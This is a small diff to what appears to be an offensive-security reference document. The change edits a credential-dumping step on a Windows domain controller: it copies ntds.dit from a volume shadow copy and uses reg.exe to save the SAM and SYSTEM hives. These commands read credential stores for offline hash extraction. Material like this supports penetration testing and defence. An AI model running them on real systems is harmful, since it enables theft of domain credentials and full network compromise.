@@ -132,8 +132,10 @@ vshadow.exe -nw -p  C:
 
 copy.exe \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\ntds\ntds.dit c:\ntds.dit.bak
 
-# Dump the registry SYSTEM hive from domain controller
-reg.exe save hklm\system c:\system.bak
+# Dump the registry SAM and SYSTEM hive from domain controller
+reg.exe save hklm\sam c:\SAM
+reg.exe save hklm\system c:\SYSTEM
+
 ```
 
 Attacker
